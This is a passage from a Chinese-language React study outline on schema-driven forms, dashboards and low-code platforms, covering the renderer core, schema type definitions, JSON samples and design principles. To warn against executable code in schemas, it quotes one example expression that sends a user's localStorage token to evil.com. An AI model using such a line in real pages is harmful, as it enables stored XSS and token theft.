# React 高阶实战大纲：Schema 驱动的复杂业务场景

> 定位：基础大纲（`react-学习大纲.md`）之上的进阶篇，建议完成基础阶段 1–4 后进入。
> 覆盖：Schema 动态表单 / Grafana 式拖拽大盘 / 拖拽式表单生成器 / JSON 编辑器 / 低代码平台。
> 周期：8–10 周。每个场景 = 协议设计 + 实现路线 + 难点坑位 + 对标开源项目 + 产出物。

## 目录

- [如何使用本文档](#如何使用本文档)
- [0. 全景认知：五大场景是一个内核](#0-全景认知五大场景是一个内核)
  - [0.1 逐行拆解这张图](#01-逐行拆解这张图)
  - [0.2 一个 20 行的最小内核（先建立整体感）](#02-一个-20-行的最小内核先建立整体感)
  - [0.3 为什么"五类场景是同一个内核"](#03-为什么五类场景是同一个内核)
  - [0.4 六件套逐行展开](#04-六件套逐行展开)
  - [0.5 学习总原则：先做渲染器，再做编辑器](#05-学习总原则先做渲染器再做编辑器)
- [1. 通用底座（1.5 周，先于一切场景）](#1-通用底座15-周先于一切场景)
  - [1.1 Schema 协议设计](#11-schema-协议设计)
  - [1.2 组件注册表模式](#12-组件注册表模式)
  - [1.3 递归渲染器](#13-递归渲染器)
  - [1.4 表达式引擎](#14-表达式引擎)
  - [1.5 Undo/Redo 三种实现](#15-undoredo-三种实现)
  - [1.6 拖拽原理（dnd-kit 精讲）](#16-拖拽原理dnd-kit-精讲)
  - [1.7 大 Schema 树性能](#17-大-schema-树性能)
- [2. Schema 动态表单（2 周）](#2-schema-动态表单2-周)
  - [实现路线（顺序即依赖）](#实现路线顺序即依赖)
  - [难点与坑](#难点与坑)
  - [对标开源（按可读性排序）](#对标开源按可读性排序)
- [3. 拖拽式表单设计器 Form Builder（2 周）](#3-拖拽式表单设计器-form-builder2-周)
  - [结构：三栏（物料区 / 画布 / 属性区）](#结构三栏物料区--画布--属性区)
  - [实现路线](#实现路线)
  - [难点与坑](#难点与坑-0)
- [4. Grafana 式拖拽仪表盘（2 周）](#4-grafana-式拖拽仪表盘2-周)
  - [实现路线](#实现路线-0)
  - [路线 1：布局层 —— react-grid-layout 的 layout model、24 列栅格与 compact 算法](#路线-1布局层--react-grid-layout-的-layout-model24-列栅格与-compact-算法)
  - [路线 2：面板协议 —— layout 与 panel 用 id 关联的数据结构](#路线-2面板协议--layout-与-panel-用-id-关联的数据结构)
  - [路线 3：面板插件化 —— panel registry](#路线-3面板插件化--panel-registry)
  - [路线 4：图表统一封装 —— echarts 组件与 setOption 时机](#路线-4图表统一封装--echarts-组件与-setoption-时机)
  - [路线 5：数据源抽象 —— Grafana 插件体系的精髓](#路线-5数据源抽象--grafana-插件体系的精髓)
  - [路线 6：时间范围全局 store + URL 双向同步](#路线-6时间范围全局-store--url-双向同步)
  - [路线 7：自动刷新 —— interval、visibilitychange、面板级节流](#路线-7自动刷新--intervalvisibilitychange面板级节流)
  - [路线 8：编辑/查看双模式与配置抽屉（Setter 复用）](#路线-8编辑查看双模式与配置抽屉setter-复用)
  - [路线 9：持久化 —— dashboard JSON 导入/导出与格式设计](#路线-9持久化--dashboard-json-导入导出与格式设计)
  - [难点与坑](#难点与坑-1)
  - [对标开源](#对标开源)
- [5. JSON 编辑器（1 周）](#5-json-编辑器1-周)
  - [选型对比](#选型对比)
  - [实现路线（以 @monaco-editor/react 为例）](#实现路线以-monaco-editorreact-为例)
  - [路线 1：非受控 model 模式 —— 本章最大坑的正面攻坚](#路线-1非受控-model-模式--本章最大坑的正面攻坚)
  - [路线 2：json worker 语法校验 + JSON Schema 补全](#路线-2json-worker-语法校验--json-schema-补全)
  - [路线 3：onChange 防抖 → JSON.parse → 错误上报工具栏的状态机](#路线-3onchange-防抖--jsonparse--错误上报工具栏的状态机)
  - [路线 4：工具条 —— 格态 / 压缩 / 复制 / 搜索替换 / 跳转错误](#路线-4工具条--格态--压缩--复制--搜索替换--跳转错误)
  - [路线 5：DiffEditor —— 两版 schema 对比](#路线-5diffeditor--两版-schema-对比)
  - [路线 6：树形 + 代码双视图 —— 光标与 JSONPath 的双向同步](#路线-6树形--代码双视图--光标与-jsonpath-的双向同步)
  - [路线 7：大 JSON 优化清单](#路线-7大-json-优化清单)
  - [路线 8：Monarch tokenizer —— 自定义 DSL 高亮入门](#路线-8monarch-tokenizer--自定义-dsl-高亮入门)
  - [难点与坑](#难点与坑-2)
- [6. 低代码平台整合（2–3 周）](#6-低代码平台整合23-周)
  - [架构](#架构)
  - [实现路线（几乎每步都在复用前面章节）](#实现路线几乎每步都在复用前面章节)
  - [难点与坑](#难点与坑-3)
  - [对标开源](#对标开源-0)
- [7. 扩展场景（同难度梯度，可选方向）](#7-扩展场景同难度梯度可选方向)
  - [7.1 节点编排画布（n8n/Dify 式工作流）](#71-节点编排画布n8ndify-式工作流)
  - [7.2 富文本/文档编辑器](#72-富文本文档编辑器)
  - [7.3 复杂数据表格](#73-复杂数据表格)
  - [7.4 画布类编辑器（白板/海报）](#74-画布类编辑器白板海报)
  - [7.5 公式编辑器](#75-公式编辑器)
- [8. 源码阅读地图（按难度递增）](#8-源码阅读地图按难度递增)
  - [8.1 rjsf —— schema 表单的入门读物](#81-rjsf--schema-表单的入门读物)
  - [8.2 react-grid-layout —— 纯算法好啃的布局库](#82-react-grid-layout--纯算法好啃的布局库)
  - [8.3 dnd-kit —— 现代拖拽的抽象设计](#83-dnd-kit--现代拖拽的抽象设计)
  - [8.4 amis —— schema 协议的大词典](#84-amis--schema-协议的大词典)
  - [8.5 formily —— 性能设计的深水区](#85-formily--性能设计的深水区)
  - [8.6 lowcode-engine —— 编辑器工程化标准](#86-lowcode-engine--编辑器工程化标准)
  - [8.7 grafana frontend —— 插件化的超大样本](#87-grafana-frontend--插件化的超大样本)
  - [8.8 通用读法：一条链路读法 + issue 驱动读法](#88-通用读法一条链路读法--issue-驱动读法)
- [9. 高频难点速查表](#9-高频难点速查表)
- [10. 节奏安排（10 周）](#10-节奏安排10-周)
  - [10.1 每章节奏公式：协议设计（半天）→ 按路线逐步实现（主体）→ 对照对标开源校验设计 → 写一篇复盘](#101-每章节奏公式协议设计半天-按路线逐步实现主体-对照对标开源校验设计--写一篇复盘)

---


## 如何使用本文档

- **阅读前提**：默认你已完成《react-学习大纲.md》基础阶段 1–4，熟悉函数组件、`useState`/`useEffect`/`useMemo`/`memo`、状态提升与 context 的基本用法。本文不再解释这些 API 本身，只在"为什么在这里用它"上花笔墨。
- **知识点结构**：每个知识点按「是什么 → 为什么需要 / 解决什么问题 → 怎么做（机制分步拆解）→ 代码示例 → 常见坑（症状 → 根因 → 修法）」展开。先建立心智模型，再看代码，最后看坑——知道"防什么"之后再回头看"怎么做"，理解会深一层。
- **代码约定**：TypeScript + React 18/19 函数组件；代码块标注 `tsx` / `ts` / `json` / `bash` / `text`；片段尽量完整（含 import）可直接跑；关键行配中文注释。
- **底座优先**：第 1 章（通用底座）是第 2–6 章所有场景的地基，后面每一章都在复用它。宁可在这里慢一周，也不要跳过练习直接做场景。
- **标记含义**：✍️ 是必须亲手做的练习；⚠️ 是高频坑，先看坑再看代码；✅ 是阶段产出与验收标准。

---

## 0. 全景认知：五大场景是一个内核

这五类场景看似不同，实际是同一条链路的不同切面：

```text
┌─────────────┐     schema(JSON)     ┌─────────────┐
│  编辑器      │ ──────────────────► │  渲染器      │
│ (拖拽/配置)  │ ◄────────────────── │ (递归执行)   │
└─────────────┘    反向同步/选中      └─────────────┘
 表单设计器/大盘编辑/低代码编辑器        动态表单/大盘运行时/低代码页面
```

### 0.1 逐行拆解这张图

这张图是全篇的"地图"，后面 8 周做的所有东西都能在上面找到位置。

**第 1 行（两个方框）——两种角色**：左边是"编辑器"，右边是"渲染器"。

- 编辑器：产出 schema 的工具，核心交互是拖拽与配置（物料区、画布、属性面板三件套）。它的产品形态是表单设计器、大盘编辑器、低代码编辑器。
- 渲染器：消费 schema 的程序，核心机制是递归执行——从根节点出发，把 JSON 树解释成组件树。它的产品形态是动态表单、大盘运行时、低代码页面。

**第 2 行（→ 箭头）——正向链路，载体是 schema(JSON)**：编辑器里发生的一切操作（拖入物料、改属性、排序、删除），最终都归结为"对 schema 树的一次修改"。渲染器不认识编辑器，只认识 schema。这意味着：渲染器可以在没有编辑器的情况下独立运行（第 2 章的动态表单就是纯渲染器产品），编辑器做的只是"更友好地修改 schema 的 GUI"。

**第 3 行（◄ 箭头）——反向链路，反向同步/选中**：渲染器侧的运行时状态要回流到编辑器：用户在画布上点了一个节点，编辑器要知道选中了谁（高亮 + 属性面板切换）；表单跑起来后 formData 的实时值、校验错误，要能回填到属性面板做联动预览。这条链路比正向链路容易被忽视，却是"所见即所得"的关键。

**第 4 行（底部两行注释）——产品矩阵**：左侧三种编辑器形态共享同一套编辑器骨架（物料区 + 画布 + 属性区 + 大纲树 + 撤销）；右侧三种运行时形态共享同一套渲染器内核（注册表 + 递归渲染 + 表达式）。形态之间的差异只体现在两点：注册了哪些组件、协议多了哪些字段。

**这张图最重要的推论**：编辑器与渲染器之间**唯一的契约是 schema**。契约唯一，所以两边可以独立开发、独立测试、独立演进——"预览"功能就是把 schema 喂给渲染器再起一个 iframe；"JSON 编辑器"（第 5 章）则是给这份数据开了第三个消费入口（文本形态）。

### 0.2 一个 20 行的最小内核（先建立整体感）

在展开概念之前，先把内核跑起来。协议 + 注册表 + 递归渲染器，核心不到 20 行：

```tsx
import type { ComponentType } from 'react'

// 1. 协议：节点 = 类型 + 属性 + 孩子
type Node = {
  id: string
  type: string
  props?: Record<string, unknown>
  children?: Node[]
}

// 2. 注册表：type 字符串 → 组件
const registry: Record<string, ComponentType<any>> = {
  page: ({ children }) => <div style={{ padding: 16 }}>{children}</div>,
  grid: ({ children, columns = 2 }) => (
    <div style={{ display: 'grid', gridTemplateColumns: `repeat(${columns}, 1fr)` }}>
      {children}
    </div>
  ),
  text: ({ content }: any) => <p>{content}</p>,
  input: ({ placeholder }: any) => <input placeholder={placeholder} />,
}

// 3. 递归渲染器：容器递归、原子终止
function RenderNode({ node }: { node: Node }) {
  const Widget = registry[node.type]
  if (!Widget) return <div>未知组件：{node.type}</div> // 未注册类型的兜底
  return (
    <Widget {...node.props}>
      {node.children?.map((child) => <RenderNode key={child.id} node={child} />)}
    </Widget>
  )
}
```

配上这样一份 JSON：

```json
{
  "id": "root", "type": "page",
  "children": [
    { "id": "t1", "type": "text", "props": { "content": "hello schema" } },
    { "id": "g1", "type": "grid", "props": { "columns": 2 }, "children": [
      { "id": "i1", "type": "input", "props": { "placeholder": "a" } },
      { "id": "i2", "type": "input", "props": { "placeholder": "b" } }
    ]}
  ]
}
```

`<RenderNode node={schema} />` 就能渲染出一个标题加两个并排输入框。第 1 章的 1.1–1.7，本质都是给这 20 行"补工程化"：1.1 给协议上类型，1.2 给注册表配物料元信息，1.3 加性能与正确性（memo、key），1.4 补逻辑表达能力，1.5 补时间线（撤销），1.6 补拖拽交互，1.7 补大树性能。心里装着这 20 行，后面每一节都知道自己在加固哪里。

### 0.3 为什么"五类场景是同一个内核"

把五个场景的核心数据与核心程序摆在一起看：

| 场景 | 核心数据（schema 是什么） | 核心程序（解释器是什么） |
|---|---|---|
| Schema 动态表单 | 字段列表/字段树 | 字段渲染器 + 校验引擎 |
| 表单设计器 | 同一张字段 schema | 编辑器 = 物料区 + 画布 + 属性面板 |
| 拖拽仪表盘 | dashboard JSON（layout + panels） | 面板渲染器 + 数据源层 |
| JSON 编辑器 | schema 本身的文本形态 | 文本编辑 + parse + 校验 |
| 低代码平台 | 页面组件树 schema（含事件/绑定/数据源） | 页面渲染器 + 表达式绑定 + 动作引擎 |

共性可以压缩成三句话：

1. **每个场景都有一棵可序列化的配置树**（JSON），树的每个节点都有 `type` 与 `props`。
2. **每个场景都需要"type 字符串 → 组件"的注册表**，否则渲染器就要为每种类型写 if-else。
3. **每个场景都用递归渲染器把树解释成组件树**；编辑器类场景再叠加"拖拽 + 选中 + Setter + Undo"，运行时类场景再叠加"数据源 + 表达式绑定"。

反过来看不做内核的代价：五个场景各自造协议、各自写渲染、各自实现撤销，等于维护五套平行系统；某天"下拉组件要支持分组选项"，你得改五个地方。内核化之后，新增一个场景的成本变成：设计协议子集 + 注册一批物料，底座（渲染、撤销、表达式、性能方案）全部复用。第 3、4、6 章会反复验证这一点——这也是为什么本章叫"通用底座，先于一切场景"。

**内核六件套**（所有场景共用，先打地基）：

| 模块 | 解决什么 | 典型实现 |
|---|---|---|
| Schema 协议 | 声明式描述"页面/表单/面板" | JSON + TypeScript discriminated union |
| 组件注册表 | `type` 字符串 → 组件的映射 | `Record<string, ComponentType>` + 物料元信息 |
| 递归渲染器 | 把 schema 树变成组件树 | 布局容器与原子组件分离、递归 + memo |
| Setter 体系 | 属性面板 = 一张配置表单 | 属性面板本身复用"动态表单"（自举） |
| 表达式引擎 | 安全的联动/条件/绑定逻辑 | expr-eval / jsonata / 自研 mini 求值器 |
| Undo/Redo | 编辑器的底线能力 | immer patches / 命令模式 / zundo |

表格每一行的完整展开见下面 0.4 节，代码级实现见第 1 章对应小节。

### 0.4 六件套逐行展开

#### 第 1 行：Schema 协议——内核的数据形态

**是什么**：一份用纯 JSON 描述"页面/表单/面板长什么样、行为如何"的图纸，例如 `{ type: 'input', props: { placeholder: '姓名' } }`。

**为什么它是第一块砖**：编辑器的一切操作都是在改这份 JSON，渲染器的一切行为都是在解释这份 JSON。协议一定，编辑器与渲染器的接口就定了；协议的表达能力上限，就是整个平台的能力上限。

**它决定三件事**：能描述什么（字段类型、布局结构、联动关系）；不能描述什么（可执行代码——逻辑交给表达式引擎，保证 schema 始终是纯数据）；以及工程属性（能否存盘、能否跨服务传输、能否做版本迁移——由"可序列化 + 版本号"保证）。完整类型定义与设计原则见 1.1。

#### 第 2 行：组件注册表——内核的词典

**是什么**：`type` 字符串到 React 组件的映射表，外加每个组件的"物料元信息"（显示名 label、图标 icon、默认 props、可配置属性声明 setters）。

**为什么需要**：渲染器是通用程序，不该知道具体组件；注册表把"新增一种组件"从"改渲染器代码"降级为"注册一条数据"，这是开闭原则在 UI 领域的直接应用。协议里的 `type` 是"词"，注册表是"词典"——词典只管收词，不管语法。

**典型实现**：静态对象映射（编译期类型检查）或运行时 `Map`（支持插件动态注册），见 1.2。

#### 第 3 行：递归渲染器——内核的解释器

**是什么**：从根节点出发的递归组件：遇到容器节点（page/grid/card）就递归渲染 `children`，遇到原子节点（input/text）就终止。它是"同一个内核"最硬的证据：表单、大盘、低代码页面跑的是**同一份 renderNode 代码**，区别只是注册表里有什么、协议里多了哪些字段。实现与性能闸门（memo）见 1.3。

#### 第 4 行：Setter 体系——内核的自举

**是什么**：编辑器右侧属性面板的生成机制——每种物料用 setters 声明"哪些属性可配、用什么控件配"，属性面板根据声明自动渲染成一张表单。

**为什么叫自举**：这张"配置表单"本身就是用第 2 章的动态表单引擎渲染的——等于用渲染器渲染"描述 schema 的 schema"。收益是一次实现、两处受益：属性面板零手写表单；动态表单引擎被自己的编辑器第一时间验证。这也是"先做渲染器，再做编辑器"的直接原因之一：Setter 依赖渲染器侧的能力。

#### 第 5 行：表达式引擎——内核的安全逻辑层

**是什么**：协议里禁止写 JS 代码，那么"当城市选北京时显示区县字段"这类逻辑放在哪？放在**表达式字符串**里（如 `$form.city == 'bj'`），由一个受限的求值器在运行时解释。

**为什么不用 `eval`/`new Function`**：安全（schema 是用户间共享的数据，等于执行任意代码）、作用域失控（表达式能摸到闭包与全局对象）、CSP 冲突。自研/引入的求值器只支持白名单语法（四则、比较、逻辑、属性访问），只能访问显式注入的上下文（`$form`/`$user`/`$now`）。100 行手写实现见 1.4。

#### 第 6 行：Undo/Redo——内核的时间线

**是什么**：把 schema 的每次变更记录成可逆操作（命令对象或 immer 补丁），支持回退与重做。它是编辑器的底线能力——一个不能撤销的编辑器没人敢用。

**为什么一处实现、五个场景受益**：因为所有场景的编辑对象都是同一份可序列化 JSON，"对 JSON 求补丁"的撤销系统天然与"这是什么编辑器"无关。三种实现（命令模式 / immer patches / zundo）与 300ms 输入合并见 1.5。

### 0.5 学习总原则：先做渲染器，再做编辑器

**学习总原则：先做渲染器，再做编辑器。** 编辑器本质是"生成 schema 的 GUI"，没有渲染器的编辑器是无根之木。

展开说四层理由：

1. **渲染器是纯函数，反馈最快**。schema 进、UI 出，没有拖拽、选中、撤销这些交互复杂度，一天就能出雏形。协议设计得合不合理（字段不够用、结构冗余、表达能力缺失），渲染器最先暴露——你会在写渲染器时频繁回头改协议，这个迭代回路越早启动越好。
2. **编辑器严格复杂于渲染器**。画布 = 渲染器 + 选中态 + 事件拦截；属性面板 = 渲染器 + Setter 体系；预览 = 渲染器本体。先有渲染器，编辑器的每一块才有可复用的地基；反过来做，等于把最难的问题放在最没有积累的时刻。
3. **协议会被"编辑器优先"的思路带偏**。先写编辑器的人，会不自觉按"编辑器内部方便"来存数据（比如直接存组件引用、存函数回调），等做渲染器、做序列化时再推倒重来。先写渲染器，协议自然被约束在"纯数据"一侧。
4. **映射到学习路径**：第 1 章底座（渲染器内核）→ 第 2 章动态表单（渲染器第一个完整产品）→ 第 3 章表单设计器（编辑器第一次落地）→ 第 4 章仪表盘 → 第 5 章 JSON 编辑器 → 第 6 章低代码平台总装。顺序不可颠倒的原因就在这张图上。

---

## 1. 通用底座（1.5 周，先于一切场景）

本章把 §0 的六件套落成可复用的代码资产。小节顺序即依赖顺序：协议（1.1）→ 注册表（1.2）→ 渲染器（1.3）→ 表达式（1.4）是"渲染器侧"的四件；撤销（1.5）与拖拽（1.6）是"编辑器侧"的两件；性能（1.7）是树变大之后必须补的最后一块。每节的代码都按"能直接搬进项目"的完整度写。

### 1.1 Schema 协议设计

- 设计原则：可序列化、声明式（不含可执行代码，逻辑走表达式）、带版本号、预留扩展字段（`x-*`）、节点有稳定 id
- 用 TS discriminated union 描述节点：`{ type: 'input'; props: {...} } | { type: 'grid'; children: Node[] }`
- ✍️ 练习：分别设计"表单字段协议"和"页面节点协议"，写出类型并手写 3 份合法 JSON 样例

#### 是什么

Schema 协议是一份**类型定义 + 约定**：规定"描述一个表单/页面，JSON 里允许出现哪些字段、每种节点的形状是什么"。它是编辑器与渲染器之间唯一的契约，也是整个平台最值得花半天反复推敲的东西——协议改一次，编辑器、渲染器、撤销系统、校验器全都要跟着动。

#### 为什么需要（解决什么问题）

先看没有协议的反面：表单设计器"保存"什么？直接保存 React 元素（`<Form.Item><Input/></Form.Item>`）？React 元素是不可序列化的对象（含函数与引用），`JSON.stringify` 直接丢失内容，没法存数据库、没法跨端传输、没法做 diff 与撤销。所以必须把"结构"从"代码"里抽出来，变成纯数据——这就是协议。

协议要同时伺候三类消费者，这决定了它的形态：

1. **渲染器**：要能根据 `type` 查注册表、根据 `props` 传参、根据 `children` 递归——所以节点必须有稳定的形状；
2. **编辑器**：要能定位（选中/移动/删除）任意节点——所以每个节点要有稳定 id；
3. **存储与传输层**：要能存取、比对新旧、升级旧版本——所以必须可序列化且带版本号。

#### 怎么做（一）：表单字段协议的完整类型定义

用 discriminated union（可辨识联合）描述：每个成员都有一个字面量类型的 `type` 字段作为"标签"，TS 依据标签自动收窄类型。

```ts
// schema/form.ts —— 协议一：动态表单的字段协议

/** 所有字段共享的公共基座 */
interface FieldBase {
  /** 节点稳定 id：渲染 key、编辑器选中、撤销补丁定位，全靠它 */
  id: string
  /** 该字段绑定到 formData 的路径，如 "profile.name" */
  fieldPath: string
  /** 显示名 */
  label: string
  /** 是否必填（注意：这是"校验声明"，不是校验逻辑本身） */
  required?: boolean
  /** 显示条件：表达式字符串，运行时由表达式引擎求值 */
  visibleWhen?: string
  /** 禁用条件：同上 */
  disabledWhen?: string
  /** 任意 x- 前缀的扩展字段：协议内核不解释、原样保留（见设计原则 4） */
  [extra: `x-${string}`]: unknown
}

/** 每种字段自己的 props 形状 */
interface InputFieldProps {
  placeholder?: string
  maxLength?: number
  allowClear?: boolean
}
interface TextareaFieldProps {
  placeholder?: string
  rows?: number
}
interface NumberFieldProps {
  min?: number
  max?: number
  step?: number
}
interface SelectFieldProps {
  options: { label: string; value: string | number }[]
  mode?: 'single' | 'multiple'
}
interface DateFieldProps {
  format?: string
}

/** 字段协议本体：discriminated union，type 是标签 */
export type FormFieldSchema =
  | (FieldBase & { type: 'input'; props: InputFieldProps })
  | (FieldBase & { type: 'textarea'; props: TextareaFieldProps })
  | (FieldBase & { type: 'number'; props: NumberFieldProps })
  | (FieldBase & { type: 'select'; props: SelectFieldProps })
  | (FieldBase & { type: 'date'; props: DateFieldProps })

/** 表单协议：根对象带版本号 + 字段数组 */
export interface FormSchema {
  /** 语义化版本：升级协议必须升这里，配合 migration 链使用（见设计原则 3） */
  schemaVersion: string
  fields: FormFieldSchema[]
}
```

**为什么不定义成一个"大而全"的 interface**（所有字段的可选属性堆在一起，`props: { placeholder?; options?; rows?; ... }`）？因为大而全意味着任何属性组合都"类型合法"：`{ type: 'input', props: { options: [...] } }` 能过编译，运行时 InputWidget 拿到 options 一脸茫然。discriminated union 让**非法组合在编译期就不存在**——`input` 节点的 props 里写 `options`，TS 直接红线。

**discriminated union 的自动收窄**，是它全部威力的来源：

```ts
function renderEditor(field: FormFieldSchema) {
  switch (field.type) {
    case 'input':
      return field.props.maxLength // ✅ TS 知道这里是 InputFieldProps
    case 'select':
      return field.props.options    // ✅ 这里是 SelectFieldProps，options 必有
    case 'number':
      return field.props.min        // ✅ number | undefined
  }
  // 所有分支穷尽后，这里 field 是 never——漏写分支会有兜底提示
}
```

#### 怎么做（二）：页面节点协议的完整类型定义

页面协议比表单协议多一层"容器嵌套"：容器节点有 `children`，原子节点没有。容器与原子分离，是递归渲染器（1.3）能干净终止的前提。

```ts
// schema/page.ts —— 协议二：低代码页面节点协议

/** 原子节点基座：没有 children */
interface AtomBase {
  id: string
  /** 显示条件：表达式 */
  visibleWhen?: string
  [extra: `x-${string}`]: unknown
}

/** 容器节点基座：有 children */
interface ContainerBase extends AtomBase {
  children: PageNode[]
}

/** 原子节点：递归的终止条件 */
type AtomNode =
  | (AtomBase & { type: 'text'; props: { content: string; level?: 1 | 2 | 3 } })
  | (AtomBase & { type: 'input'; props: { fieldPath: string; placeholder?: string } })
  | (AtomBase & {
      type: 'button'
      props: { text: string; onClickAction?: string } // 动作名是字符串引用，不是函数（见设计原则 2）
    })

/** 容器节点：递归继续 */
type ContainerNode =
  | (ContainerBase & { type: 'page' })
  | (ContainerBase & { type: 'grid'; props: { columns: number; gap?: number } })
  | (ContainerBase & { type: 'card'; props: { title?: string } })

export type PageNode = AtomNode | ContainerNode

export interface PageSchema {
  schemaVersion: string
  root: PageNode
}
```

容器/原子的判定，用一个类型守卫，配合 TS 内置的 `Extract` 工具类型从联合中抽出"有 children 的成员"：

```ts
/** 从 PageNode 联合中提取出"带 children 属性"的成员类型 */
export type ContainerOf<N> = Extract<N, { children: unknown }>

export function isContainer(node: PageNode): node is ContainerOf<PageNode> {
  return 'children' in node
}
```

`Extract<PageNode, { children: unknown }>` 的含义是"联合中所有能赋值给 `{ children: unknown }` 的成员"，也就是三个容器成员。守卫返回 true 时，TS 自动把 `node` 收窄成容器类型，`.children` 可直接访问。

#### 怎么做（三）：3 份合法 JSON 样例

**样例 1：表单字段协议（含表达式联动）**

```json
{
  "schemaVersion": "1.0.0",
  "fields": [
    {
      "id": "f_name",
      "type": "input",
      "fieldPath": "name",
      "label": "姓名",
      "required": true,
      "props": { "placeholder": "请输入姓名", "maxLength": 20 }
    },
    {
      "id": "f_city",
      "type": "select",
      "fieldPath": "city",
      "label": "城市",
      "props": {
        "mode": "single",
        "options": [
          { "label": "北京", "value": "bj" },
          { "label": "上海", "value": "sh" }
        ]
      }
    },
    {
      "id": "f_district",
      "type": "input",
      "fieldPath": "district",
      "label": "区县",
      "visibleWhen": "$form.city == 'bj'",
      "props": { "placeholder": "仅城市选北京时显示" }
    }
  ]
}
```

看点：`f_district.visibleWhen` 是表达式字符串——"逻辑是数据"的直接体现；`required` 只是声明，校验器（第 2 章）依据声明执行。

**样例 2：页面节点协议（嵌套容器）**

```json
{
  "schemaVersion": "1.1.0",
  "root": {
    "id": "n_root",
    "type": "page",
    "children": [
      { "id": "n_title", "type": "text", "props": { "content": "活动报名", "level": 2 } },
      {
        "id": "n_grid",
        "type": "grid",
        "props": { "columns": 2, "gap": 12 },
        "children": [
          { "id": "n_name", "type": "input", "props": { "fieldPath": "name", "placeholder": "姓名" } },
          { "id": "n_phone", "type": "input", "props": { "fieldPath": "phone", "placeholder": "手机号" } }
        ]
      },
      { "id": "n_submit", "type": "button", "props": { "text": "提交", "onClickAction": "submitForm" } }
    ]
  }
}
```

看点：`page > grid > input` 的三层嵌套就是递归渲染器的考卷；`onClickAction: "submitForm"` 是动作注册表里的字符串键（第 6 章动作引擎消费），不是函数。

**样例 3：页面协议（表达式绑定 + x- 扩展字段，协议 1.2.0 的形态）**

```json
{
  "schemaVersion": "1.2.0",
  "root": {
    "id": "n_root",
    "type": "page",
    "children": [
      {
        "id": "n_stat",
        "type": "text",
        "props": { "content": "默认文案" },
        "bindings": { "content": "'今日新增：' + $stats.today + ' 条'" },
        "x-track": { "exposure": "home_stat_text" }
      },
      {
        "id": "n_vip",
        "type": "card",
        "props": { "title": "会员中心" },
        "visibleWhen": "$user.vip",
        "x-designer": { "locked": true },
        "children": [
          {
            "id": "n_renew",
            "type": "button",
            "props": { "text": "续费" },
            "events": [{ "event": "click", "action": "openModal", "args": { "id": "renew" } }]
          }
        ]
      }
    ]
  }
}
```

看点：`bindings`（哪个 prop 由哪个表达式驱动）、`events`（事件-动作绑定）是低代码协议 1.2.0 新增的字段——它们是"可选字段 + 版本号"机制平滑加上去的，旧渲染器忽略不认识的字段照常工作；`x-track` / `x-designer` 是业务方/编辑器塞的私有元数据，协议内核原样透传。

#### 设计原则逐条：为什么

**原则 1：可序列化（schema 必须是纯 JSON 数据）——为什么这是第一原则**

可序列化意味着 `JSON.parse(JSON.stringify(schema))` 无损（或等价地用 `structuredClone`）。这个朴素性质支撑了整个体系的地基设施：

| 能力 | 为什么依赖可序列化 |
|---|---|
| 持久化 | localStorage / 数据库存的就是字符串 |
| 网络传输 | 跨服务、跨端（设计器保存、手机端渲染）靠 HTTP 传 JSON |
| 撤销/重做 | immer patches 作用于普通对象；快照方案要深拷贝 |
| 比对与协同 | diff / JSON Patch / CRDT 都建立在"纯数据"上 |
| 版本迁移 | migration 是"读旧 JSON → 返回新 JSON"的纯函数 |
| 校验 | 可以用 JSON Schema 对"schema 本身"做静态校验（第 5 章自动补全的基础） |

反过来，任何"塞函数、塞 class 实例、塞 Date、塞循环引用"的行为都会同时打断以上全部。所以协议里**逻辑只能以字符串引用或表达式字符串存在**，组件、动作、校验器全部住在注册表里，schema 只存"键"。

**原则 2：声明式，不含可执行代码——为什么**

三层原因：

1. **安全**：低代码/表单平台的 schema 由运营或第三方接入方编写、在所有访问者的浏览器里执行。允许代码等于允许 `fetch('//evil.com?c=' + localStorage.getItem('token'))` 这样的表达式入库——这是存储型 XSS 的温床。真正需要执行用户自定义 JS 的场景（第 6 章），必须走 iframe sandbox / quickjs-emscripten 隔离，而不是直接 eval。
2. **可序列化的前提**：函数不可序列化，原则 1 直接要求"无代码"。
3. **可静态分析**：不含代码的 schema 可以被 JSON Schema 校验、被编辑器安全地展示和修改（属性面板改一个函数引用？没法序列化也没法展示）。逻辑需求（显隐联动、禁用联动、取值绑定）全部改用表达式字符串表达，由 1.4 的求值器解释——表达式是数据，能校验、能缓存、能高亮报错。

**原则 3：带版本号——为什么**

协议一定会演化（样例 3 就从 1.1.0 长出了 bindings/events）。没有版本号的后果是：线上存了两百份"历史形态"的 schema，新渲染器读不懂，页面白屏，而你根本不知道每份是什么年代的。正确姿势：

```ts
// 版本迁移链示意：每个版本一个纯函数，旧 schema 逐级升到最新
type Migration = (old: any) => any

const migrations: Record<string, Migration> = {
  '1.0.0→1.1.0': (doc) => ({ ...doc, schemaVersion: '1.1.0', root: toPageTree(doc) }),
  '1.1.0→1.2.0': (doc) => ({
    ...doc,
    schemaVersion: '1.2.0',
    root: addBindingsSupport(doc.root), // 1.2.0 只是"允许"bindings，旧行为不变
  }),
}

export function migrate(doc: any): any {
  let cur = doc
  while (cur.schemaVersion !== LATEST) {
    const step = migrations[`${cur.schemaVersion}→${next(cur.schemaVersion)}`]
    if (!step) throw new Error(`无法迁移的 schema 版本：${cur.schemaVersion}`)
    cur = step(cur)
  }
  return cur
}
```

要点：迁移函数是纯函数（旧 JSON 进、新 JSON 出），可以测试、可以批处理跑历史数据；渲染器只支持最新版，入口处统一 `migrate`。

**原则 4：预留 `x-` 扩展字段——它与版本迁移的关系**

`x-` 前缀是协议的"私有扩展命名空间"（思路同 HTTP 的 `x-` 头）：

- **解决谁的痛点**：业务方/二开方想往节点上挂自己的元数据（埋点 `x-track`、设计器锁定态 `x-designer`），但协议是平台演进的，你今天塞个 `locked: true`，半年后官方给 `locked` 赋了别的含义——冲突了。`x-` 命名空间保证"官方永不占用、业务随意使用"。
- **与版本迁移的协作规则**：(a) 迁移函数与编辑器必须**原样保留**所有 `x-` 字段（round-trip 不丢）；(b) 官方从实验走向正式的字段，走"从 `x-foo` 转正为 `foo` + 升版本号 + migration 把 `x-foo` 拷贝到 `foo`"的路径。这样实验期不污染协议，转正时有明确的迁移点。
- **TS 层的表达**：就是 `FieldBase` 里那行模板字面量索引签名 `[extra: `x-${string}`]: unknown`——任何 `x-` 开头的键类型合法，值类型不约束。

**原则 5：节点有稳定 id——为什么**

